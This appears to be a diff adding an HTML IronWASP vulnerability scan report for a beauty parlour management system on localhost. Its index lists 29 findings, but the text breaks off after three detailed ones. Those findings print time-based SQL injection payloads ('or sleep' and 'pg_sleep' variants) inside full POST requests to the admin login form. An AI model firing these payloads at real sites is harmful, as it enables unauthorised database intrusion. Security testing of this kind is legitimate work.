@@ -1,0 +1,1651 @@
+
+<html>
+<head>
+<title>IronWASP Security Analysis Report</title>
+<style>
+body
+{
+    font-family: Palatino, "Palatino Linotype", "Palatino LT STD", "Book Antiqua", Georgia, serif;
+    margin: 0px;
+    padding: 0px;
+    background-color: #555;
+    overflow: auto;
+}
+#report_header
+{
+    background-color: #75D1FF;
+    margin-bottom: 10px;
+}
+#report_title
+{
+    background-color: #555;
+    padding-top: 5px;
+    padding-bottom: 5px;
+    font-size: xx-large;
+    color: #FFF;
+    text-align: center;
+}
+#report_sub_title
+{
+    padding-top: 5px;
+    padding-bottom: 5px;
+    color: #555;
+    text-align: center;
+}
+#report_sub_title a
+{
+    color: #555;
+    font-weight: bold;
+}
+#report_footer
+{
+    color: #FFF;
+    text-align: center;
+    font-size: small;
+    padding-bottom: 10px;
+}
+.report
+{    
+     width: 1000px;
+     margin-left: 250px;
+     color: #FFF;
+}
+#overview
+{
+    color: #333;
+     background-color: #FFF;
+     border-style: outset;
+     border-color: #555;
+     padding: 20px;
+     margin: 10px;
+     overflow: auto;
+}
+#index
+{
+    color: #333;
+    background-color: #FFF;
+    border-style: outset;
+    border-color: #555;
+    padding: 20px;
+    margin: 10px;
+    overflow: auto;
+}
+#index a
+{
+    text-decoration: none;
+}
+#index ul
+{
+    list-style-type: square;
+}
+#index ul li
+{
+    padding-top: 15px;
+    padding-bottom: 3px;
+}
+#index ol li
+{
+    padding: 3px;
+}
+.index_finding_url
+{
+    color: #333;
+}
+.section_title
+{
+    color: #555;
+    border-color: #75D1FF;;
+    border-style: solid;
+    border-width: thick;
+    background-color: #75D1FF;;
+    padding: 10px;
+    margin: 10px;
+    margin-top: 20px;
+    font-size: x-large;
+    font-weight: bold;
+    overflow: auto;
+}
+.finding
+{
+    color: #333;
+     background-color: #FFF;
+     border-style: outset;
+     border-color: #555;
+     padding: 20px;
+     margin: 10px;
+     overflow: auto;
+}
+.finding table
+{
+    padding: 5px;
+    margin: 5px;
+    margin-left: 20px;
+}
+.finding td
+{
+    margin-left: 10px;
+}
+
+.trigger
+{
+    color: #333;
+    border-style: ridge;
+    border-color: #AAA;
+    margin: 10px;
+    padding: 10px;
+    overflow: auto;
+}
+.trigger_desc
+{
+    margin-top: 20px;
+    text-align: center;
+    color: #50D;
+}
+#quick_nav
+{
+    position: fixed;
+    width: 230px;
+    overflow: auto;
+}
+
+#quick_nav a
+{
+    color: #000;
+    text-decoration: none;
+}
+
+#quick_nav a:hover
+{
+    color: #75D1FF;
+}
+.quick_nav_link
+{
+    width: 220px;
+    background-color: #FFF;
+    padding: 2px;
+    padding-left: 5px; 
+    margin: 2px;
+    margin-top: 5px;
+}
+.host
+{
+    color: #555;
+    border-color: #75D1FF;;
+    border-style: solid;
+    border-width: thick;
+    background-color: #75D1FF;
+    padding: 10px;
+    margin: 10px;
+    margin-top: 20px;
+    font-size: x-large;
+    font-weight: bold;
+    overflow: auto;
+}
+.high_finding_title
+{
+    background-color: red;
+    color: #FFF;
+    font-size: large;
+    font-weight: bold;
+    padding: 10px;
+    margin-bottom: 10px;
+    overflow: auto;
+}
+.medium_finding_title
+{
+    background-color: orange;
+    color: #000;
+    font-size: large;
+    font-weight: bold;
+    padding: 10px;
+    margin-bottom: 10px;
+    overflow: auto;
+}
+.low_finding_title
+{
+    background-color: yellow;
+    color: #000;
+    font-size: large;
+    font-weight: bold;
+    padding: 10px;
+    margin-bottom: 10px;
+    overflow: auto;
+}
+.info_finding_title
+{
+    background-color: blue;
+    color: #FFF;
+    font-size: large;
+    font-weight: bold;
+    padding: 10px;
+    margin-bottom: 10px;
+    overflow: auto;
+}
+.lead_finding_title
+{
+    background-color: green;
+    color: #FFF;
+    font-size: large;
+    font-weight: bold;
+    padding: 10px;
+    margin-bottom: 10px;
+    overflow: auto;
+}
+.affected_url
+{
+    color: #0077FF;
+    text-decoration: underline;
+    overflow: auto;
+}
+.reason_title
+{
+    background-color: #3C3;
+    padding: 3px;
+    margin-top: 10px;
+    margin-bottom: 5px;
+    font-weight: bold;
+}
+.finding_nav_links
+{
+    color: #75D1FF;
+}
+.finding_nav_links a
+{
+    font-weight: bold;
+    color: #75D1FF;
+    text-decoration: none;
+    padding-left: 10px;
+    padding-right: 10px;
+    padding-top: 1px;
+    padding-bottom: 1px;
+    margin: 10px;
+    margin-left: 0px;
+    border-color: #75D1FF;
+    border-style: solid;
+    border-width: 1px;
+}
+.finding_nav_links a:hover
+{
+    color: #FFF;
+    text-decoration: none;
+    background-color: #75D1FF;
+}
+.host_nav_links
+{
+    color: #75D1FF;
+}
+.host_nav_links a
+{
+    font-weight: bold;
+    color: #75D1FF;
+    text-decoration: none;
+    padding-left: 10px;
+    padding-right: 10px;
+    padding-top: 1px;
+    padding-bottom: 1px;
+    margin: 10px;
+    border-color: #75D1FF;
+    border-style: solid;
+    border-width: 1px;
+
+}
+.host_nav_links a:hover
+{
+    color: #FFF;
+    text-decoration: none;
+    background-color: #75D1FF;
+}
+
+.desc
+{
+    margin-top: 15px;
+    margin-bottom: 15px;
+    overflow: auto;
+}
+.desc_title
+{
+    font-weight: bold;
+    padding-bottom: 10px;
+    text-decoration: underline;
+}
+.reason
+{
+    margin-top: 15px;
+    margin-bottom: 15px;
+    overflow: auto;
+}
+.reason_section_title
+{
+    font-weight: bold;
+    padding-bottom: 10px;
+    text-decoration: underline;
+}
+.fpa_check
+{
+    margin-top: 10px;
+    margin-bottom: 10px;
+    overflow: auto;
+}
+.fpa_check_title
+{
+    font-weight: bold;
+    padding-bottom: 5px;
+    text-decoration: underline;
+    color: #3C3;
+}
+th
+{
+    background-color: #75D1FF;
+    color: #555;
+    padding-top: 10px;
+    padding-bottom: 10px;
+    text-align: center;
+}
+.t_high
+{
+    color:  #FF0000;
+    border-style: none;
+    font-weight: bold;
+    text-align: center;
+}
+.t_med
+{
+    color:  #FF9900;
+    border-style: none;
+    font-weight: bold;
+    text-align: center;
+}
+.t_low
+{
+    color:  #B8B800;
+    border-style: none;
+    font-weight: bold;
+    text-align: center;
+}
+.t_info
+{
+    color: #0099FF;
+    border-style: none;
+    font-weight: bold;
+    text-align: center;
+}
+.t_lead
+{
+    color: #339933;
+    border-style: none;
+    font-weight: bold;
+    text-align: center;
+}
+.t_total
+{
+    color: #000;
+    border-style: none;
+    font-weight: bold;
+    text-align: center;
+}
+.t_high_conf
+{
+    background-color: #000;
+    color: #FFF;
+    margin-bottom: 20px;
+    text-align: center;
+}
+.t_med_conf
+{
+    background-color: #444;
+    color: #AAA;
+    margin-bottom: 20px;
+    text-align: center;
+}
+.t_low_conf
+{
+    background-color: #999;
+    color: #333;
+    margin-bottom: 20px;
+    text-align: center;
+            
+}
+.t_host
+{
+    width: 400px;
+    color: #0077FF;
+    text-decoration: underline;
+    text-align: left;
+    overflow: auto;
+}
+
+.legend
+{
+    font-size: small;
+}
+.legend td
+{
+    font-size: small;
+}
+
+.icr { color: red; }
+.icb { color: #0077FF; }
+.icy { color: #B8B800; }
+.ico { color: orange; }
+.icg { color: #3C3; }
+
+.hlr { background-color: red; }
+.hlb { background-color: #0077FF; }
+.hly { background-color: #B8B800; }
+.hlo { background-color: orange; }
+.hlg { background-color: #3C3; }
+    
+.ihh {font-weight: bold; color: #0077FF; text-decoration: underline;}
+.fname {font-weight: bold; }
+</style>
+</head>
+<body>
+<div id='report_header'>
+<div id='report_title'>IronWASP Security Analysis Report</div>
+<div id='report_sub_title'>Report based on the analysis performed by the open source web security software, <a href='https://ironwasp.org'>IronWASP</a></div>
+</div>
+
+
+<span id='quick_nav'>
+    <a href='#overview'><div class='quick_nav_link'>Overview</div></a>
+    <a href='#index'><div class='quick_nav_link'>Index</div></a>
+
+<a href='#host1'><div class='quick_nav_link'>http://127.0.0.1/</div></a>
+</span>
+
+
+<div class='report'>
+<div class='section_title'>Overview</div>
+<div id='overview'>
+This report contains the list of security findings discovered by IronWASP. The current section of the report gives a brief overview of the number of different findings, the numbers are categorized by the hosts they were discovered on.
+<br>
+The index section contains the names of all the findings. The sections after that show details of every individual finding.
+<br><br>
+The table below shows the number of findings discovered in each host. The findings are seperated based on their type and severity.<br>
+<br><br>
+<div class='legend'>
+<div class='fname'>Legend:</div>
+<br>
+<table cellpadding='0' cellspacing='0'>
+<tr><td align='right'><span class='icr'><b>High</b></span></td> <td>&nbsp;&nbsp;&nbsp;&nbsp;High Severity Vulnerability</td></tr>
+<tr><td align='right'><span class='ico'><b>Medium</b></span></td> <td>&nbsp;&nbsp;&nbsp;&nbsp;Medium Severity Vulnerability</td></tr>
+<tr><td align='right'><span class='icy'><b>Low</b></span></td> <td>&nbsp;&nbsp;&nbsp;&nbsp;Low Severity Vulnerability</td></tr>
+<tr><td align='right'><span class='icb'><b>Info</b></span></td> <td>&nbsp;&nbsp;&nbsp;&nbsp;Information Findings</td></tr>
+<tr><td align='right'><span class='icg'><b>Test Leads</b></span></td> <td>&nbsp;&nbsp;&nbsp;&nbsp;Things of interest for manual testing</td></tr>
+</table>
+<br>
+The High, Medium and Low severity vulnerability numbers are also split based on the confidence with which IronWASP has reported them.<br>
+<br>
+<span class='t_high_conf'>&nbsp;&nbsp;0&nbsp;&nbsp;</span>&nbsp;&nbsp;&nbsp; High Confidence &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<span class='t_med_conf'>&nbsp;&nbsp;0&nbsp;&nbsp;</span>&nbsp;&nbsp;&nbsp; Medium Confidence &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<span class='t_low_conf'>&nbsp;&nbsp;0&nbsp;&nbsp;</span>&nbsp;&nbsp;&nbsp; Low Confidence &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</div>
+<br>
+
+<table cellpadding='0' cellspacing='0'>
+<tr>
+    <th width='100' >High</th>
+    <th width='20'> </th>
+    <th width='100'>Medium</th>
+    <th width='20'> </th>
+    <th width='100'>Low</th>
+    <th width='100'>Info</th>
+    <th width='100'>Test leads</th>
+    <th width='20'> </th>
+    <th width='30'>Total</th>
+    <th width='30'> </th>
+    <th width='400'>Hosts</th>
+</tr>
+<tr>
+    <td height='20px'></td>
+</tr>
+
+<tr>
+            <td>
+                <div class='t_high'>22</div>
+            </td>
+            <td></td>
+            <td>
+                <div class='t_med'>3</div>
+            </td>
+            <td></td>
+            <td>
+                <div class='t_low'>2</div>
+            </td>
+            <td>
+                <div class='t_info'>2</div>
+            </td>
+            <td><div class='t_lead'>0</div></td>
+            <td></td>
+            <td><div class='t_total'>29</div></td>
+            <td></td>            
+            <td><div class='t_host'>http://127.0.0.1/</div></td>
+        </tr>
+<tr>
+            <td>
+                <table cellpadding='0' cellspacing='0'>
+                    <tr>
+                        <td width='30'><div class='t_high_conf'>0</div></td>
+                        <td width='30'><div class='t_med_conf'>22</div></td>
+                        <td width='30'><div class='t_low_conf'>0</div></td>
+                    </tr>
+                </table>
+            </td>
+            <td></td>
+<td>
+                <table cellpadding='0' cellspacing='0'>
+                    <tr>
+                        <td width='30'><div class='t_high_conf'>2</div></td>
+                        <td width='30'><div class='t_med_conf'>0</div></td>
+                        <td width='30'><div class='t_low_conf'>1</div></td>
+                    </tr>
+                </table>
+            </td>
+            <td></td>
+<td>
+                <table cellpadding='0' cellspacing='0'>
+                    <tr>
+                        <td width='30'><div class='t_high_conf'>2</div></td>
+                        <td width='30'><div class='t_med_conf'>0</div></td>
+                        <td width='30'><div class='t_low_conf'>0</div></td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+</table>
+</div>
+<div class='section_title'>Index</div>
+<div id='index'>
+The titles of all the findings are listed below categorized by the host they were discovered on. All items in the list below are links to relevant sections in the report.
+<br>
+
+<a href='#host1'><div class='host'>http://127.0.0.1/</div></a>
+<ul>
+
+<li><a href='#finding1'><span class='icr'>SQL Injection Detected</span></a></li>
+<ol>
+<li><a href='#finding1'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/index.php</span></a></li>
+<li><a href='#finding2'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/</span></a></li>
+<li><a href='#finding3'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/index.php</span></a></li>
+<li><a href='#finding4'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/index.php</span></a></li>
+<li><a href='#finding5'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/index.php</span></a></li>
+<li><a href='#finding6'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php</span></a></li>
+<li><a href='#finding7'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php</span></a></li>
+<li><a href='#finding8'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php</span></a></li>
+<li><a href='#finding9'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/</span></a></li>
+<li><a href='#finding10'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php</span></a></li>
+<li><a href='#finding11'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/</span></a></li>
+<li><a href='#finding12'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/</span></a></li>
+<li><a href='#finding13'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/</span></a></li>
+<li><a href='#finding14'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php</span></a></li>
+<li><a href='#finding15'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php</span></a></li>
+<li><a href='#finding16'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/index.php</span></a></li>
+<li><a href='#finding17'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php</span></a></li>
+<li><a href='#finding18'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php</span></a></li>
+<li><a href='#finding19'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php</span></a></li>
+<li><a href='#finding20'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/index.php</span></a></li>
+<li><a href='#finding21'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php</span></a></li>
+</ol>
+<li><a href='#finding22'><span class='icr'>Code Injection Found</span></a></li>
+<ol>
+<li><a href='#finding22'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/</span></a></li>
+</ol>
+
+
+<li><a href='#finding23'><span class='ico'>Cookie PHPSESSID missing the HttpOnly flag</span></a></li>
+<ol>
+<li><a href='#finding23'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/</span></a></li>
+</ol>
+<li><a href='#finding24'><span class='ico'>Sensitive Form loaded and submitted Insecurely</span></a></li>
+<ol>
+<li><a href='#finding24'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/</span></a></li>
+</ol>
+
+
+<li><a href='#finding25'><span class='ico'>Session Fixation Found</span></a></li>
+<ol>
+<li><a href='#finding25'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/index.php</span></a></li>
+</ol>
+
+<li><a href='#finding26'><span class='icy'>Server leaks version number</span></a></li>
+<ol>
+<li><a href='#finding26'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/</span></a></li>
+</ol>
+<li><a href='#finding27'><span class='icy'>AutoComplete Enabled on Password Fields</span></a></li>
+<ol>
+<li><a href='#finding27'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/admin/</span></a></li>
+</ol>
+
+
+
+<li><a href='#finding28'><span class='icb'>Runs on Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.2.4</span></a></li>
+<ol>
+<li><a href='#finding28'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/</span></a></li>
+</ol>
+<li><a href='#finding29'><span class='icb'>Technologies identified on Server</span></a></li>
+<ol>
+<li><a href='#finding29'><span class='index_finding_url'>/4.quality-beauty-parlour-management-system/bea/</span></a></li>
+</ol>
+
+
+</ul>
+</div>
+
+<div class='host' id='host1'>http://127.0.0.1/</div>
+<div class='host_nav_links'></div><div class='finding' id='finding1'>
+<div class='high_finding_title'>SQL Injection Detected</div>
+<div class='finding_nav_links'><a href='#finding2'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='icr'>High</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>Medium</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Active Scanning</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/index.php</span></td></div></tr>
+<tr><div class='affected_parameter'><td><span class='fname'>Affected Parameter:</span></td><td>username</td></div></tr>
+<tr><div class='affected_section'><td><span class='fname'>Parameter Location:</span></td><td>Body</td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>SQL Injection was identified in the <span class='ico'><b>username</b></span> parameter of the <span class='ico'><b>Body</b></span> section of the scanned request.<br><br>SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer <span class='icb'>https://www.owasp.org/index.php/SQL_Injection</span><br><br></div>
+<div class='reason_section_title'>Reasons:</div>
+IronWASP has reported this issue because of the following reason:<br>
+<div class='reason'><div class='reason_title'>Reason:</div>
+IronWASP sent <span class='hlg'>' or sleep(18)#</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>18074</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>18074</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>27033</span> milliseconds. Normally this particular request is processed at around </span>9037</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 18074 milliseconds. The payload is ' or sleep(18)#</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/index.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>username=<span class='hlg'>'+or+sleep(18)%23</span>&amp;password=yyyyy&amp;login=Sign+In<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 27033 milliseconds to get this response. It took so long because of the 18074 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+</div>
+<div class='finding' id='finding2'>
+<div class='high_finding_title'>SQL Injection Detected</div>
+<div class='finding_nav_links'><a href='#finding1'>&lt;&lt;&lt;</a><a href='#finding3'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='icr'>High</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>Medium</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Active Scanning</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/</span></td></div></tr>
+<tr><div class='affected_parameter'><td><span class='fname'>Affected Parameter:</span></td><td>username</td></div></tr>
+<tr><div class='affected_section'><td><span class='fname'>Parameter Location:</span></td><td>Body</td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>SQL Injection was identified in the <span class='ico'><b>username</b></span> parameter of the <span class='ico'><b>Body</b></span> section of the scanned request.<br><br>SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer <span class='icb'>https://www.owasp.org/index.php/SQL_Injection</span><br><br></div>
+<div class='reason_section_title'>Reasons:</div>
+IronWASP has reported this issue because of the following reason:<br>
+<div class='reason'><div class='reason_title'>Reason:</div>
+IronWASP sent <span class='hlg'>' or sleep(5)#</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>23106</span> milliseconds. Normally this particular request is processed at around </span>14</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is ' or sleep(5)#</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/ HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>username=<span class='hlg'>'+or+sleep(5)%23</span>&amp;password=yyyyy&amp;login=Sign+In<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 23106 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+</div>
+<div class='finding' id='finding3'>
+<div class='high_finding_title'>SQL Injection Detected</div>
+<div class='finding_nav_links'><a href='#finding2'>&lt;&lt;&lt;</a><a href='#finding4'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='icr'>High</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>Medium</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Active Scanning</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/index.php</span></td></div></tr>
+<tr><div class='affected_parameter'><td><span class='fname'>Affected Parameter:</span></td><td>username</td></div></tr>
+<tr><div class='affected_section'><td><span class='fname'>Parameter Location:</span></td><td>Body</td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>SQL Injection was identified in the <span class='ico'><b>username</b></span> parameter of the <span class='ico'><b>Body</b></span> section of the scanned request.<br><br>SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer <span class='icb'>https://www.owasp.org/index.php/SQL_Injection</span><br><br></div>
+<div class='reason_section_title'>Reasons:</div>
+IronWASP has reported this issue because of the following reason:<br>
+<div class='reason'><div class='reason_title'>Reason:</div>
+IronWASP sent <span class='hlg'>' or sleep(5)#</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>15335</span> milliseconds. Normally this particular request is processed at around </span>7</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is ' or sleep(5)#</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/index.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>username=<span class='hlg'>'+or+sleep(5)%23</span>&amp;password=mmm&amp;login=Sign+In<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 15335 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+</div>
+<div class='finding' id='finding4'>
+<div class='high_finding_title'>SQL Injection Detected</div>
+<div class='finding_nav_links'><a href='#finding3'>&lt;&lt;&lt;</a><a href='#finding5'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='icr'>High</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>Medium</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Active Scanning</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/index.php</span></td></div></tr>
+<tr><div class='affected_parameter'><td><span class='fname'>Affected Parameter:</span></td><td>login</td></div></tr>
+<tr><div class='affected_section'><td><span class='fname'>Parameter Location:</span></td><td>Body</td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>SQL Injection was identified in the <span class='ico'><b>login</b></span> parameter of the <span class='ico'><b>Body</b></span> section of the scanned request.<br><br>SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer <span class='icb'>https://www.owasp.org/index.php/SQL_Injection</span><br><br></div>
+<div class='reason_section_title'>Reasons:</div>
+IronWASP has reported this issue because of the following reason:<br>
+<div class='reason'><div class='reason_title'>Reason:</div>
+IronWASP sent <span class='hlg'>&quot; and pg_sleep(5)--</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>10490</span> milliseconds. Normally this particular request is processed at around </span>3</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
